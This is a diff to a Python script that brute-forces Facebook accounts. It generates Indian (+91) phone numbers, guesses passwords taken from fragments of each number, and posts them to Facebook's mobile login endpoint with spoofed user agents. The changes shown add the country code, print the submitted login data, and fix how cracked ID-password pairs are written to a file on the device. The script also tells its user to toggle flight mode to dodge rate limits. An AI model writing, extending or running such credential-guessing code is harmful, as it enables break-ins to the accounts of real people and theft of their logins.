@@ -47,7 +47,7 @@ def useragent_facebook():
         ]))
 ###-------[LOGO]-----------####
 logo= f'''\033[1;92m---------------------------------------------------
- \033[1;92m[\033[1;92m•\033[1;92m] Author   : sumon roy
+ \033[1;92m[\033[1;92m•\033[1;92m] Author   : SUMON ROY
 \033[1;92m---------------------------------------------------'''
 ###-------[CLEAR TERMINAL]-----------####
 def clear():
@@ -95,8 +95,9 @@ def random_number():
         print(" \033[1;32m(√) \033[1;32mUse Flight Mode")
         linex()
         for xyz in idz:
-            uid = code+xyz
-            pww = [uid[:6],uid[:8],uid] 
+            uidd = code+xyz
+            uid = '+91' +uidd
+            pww = [uidd[:6],uidd[:8],uidd] 
          #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
             XYZ.submit(crack, uid, pww, total_idz)
     linex()
@@ -164,7 +165,7 @@ def crack(uid, pww, total_idz):
             'user-agent': useragent_facebook(),
             'viewport-width': '980',}
             response = session.post('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
-            #print(headers)
+            print(data)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
@@ -201,7 +202,7 @@ def crack(uid, pww, total_idz):
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
                 #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
-                open('/sdcard/CRACK/CP.txt', 'a').write( ids+' | '+pas+'\n')
+                open('/sdcard/CRACK/CP.txt', 'a').write( uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:continue
